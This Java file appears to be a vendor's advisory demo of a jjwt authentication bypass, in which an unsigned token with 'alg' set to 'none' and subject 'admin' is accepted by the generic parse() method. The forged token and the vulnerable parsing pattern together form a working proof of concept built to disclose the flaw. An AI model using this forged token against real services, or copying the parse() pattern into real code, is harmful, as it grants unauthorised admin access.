package dev.chainguard.jjwtbypass;

import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jwt;
import io.jsonwebtoken.JwtException;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;

import java.nio.charset.StandardCharsets;
import java.util.Base64;

/**
 * Demonstrates CGP-xpq5-jm7p-884r, the jjwt signature-stripping authentication
 * bypass. The application configures a signing key and validates tokens with
 * the generic {@code parse()} method. With a vulnerable jjwt the parser skips
 * signature verification whenever the signature segment is empty, so a forged,
 * unsigned token is accepted as authentic.
 */
public final class JwtDemo {

    // Fixed, base64-encoded demo secret so the output is reproducible.
    private static final String KEY =
        Base64.getEncoder().encodeToString(
            "demo-secret-key-that-is-long-enough".getBytes(StandardCharsets.UTF_8));

    public static void main(String[] args) {
        // A properly signed token for a normal user.
        String signed = Jwts.builder()
            .setSubject("alice")
            .signWith(SignatureAlgorithm.HS256, KEY)
            .compact();

        // A forged, unsigned token: header.payload. with the signature stripped.
        // Decodes to {"alg":"none"} and {"sub":"admin"}.
        String forged = b64("{\"alg\":\"none\"}") + "." + b64("{\"sub\":\"admin\"}") + ".";

        System.out.println();
        System.out.println("Signed token  -> " + authenticate(signed));
        System.out.println("Forged token  -> " + authenticate(forged));
        System.out.println();
    }

    /**
     * The application's authentication check. A signing key is configured and
     * the token is parsed with the generic {@code parse()}, exactly the pattern
     * the advisory flags. A fixed library rejects the forged token here.
     */
    private static String authenticate(String token) {
        try {
            Jwt<?, ?> jwt = Jwts.parser().setSigningKey(KEY).parse(token);
            Object body = jwt.getBody();
            String subject = (body instanceof Claims)
                ? ((Claims) body).getSubject()
                : String.valueOf(body);
            return "ACCEPTED as '" + subject + "'";
        } catch (JwtException e) {
            return "REJECTED (" + e.getClass().getSimpleName() + ")";
        }
    }

    private static String b64(String json) {
        return Base64.getUrlEncoder().withoutPadding()
            .encodeToString(json.getBytes(StandardCharsets.UTF_8));
    }

    private JwtDemo() {
    }
}
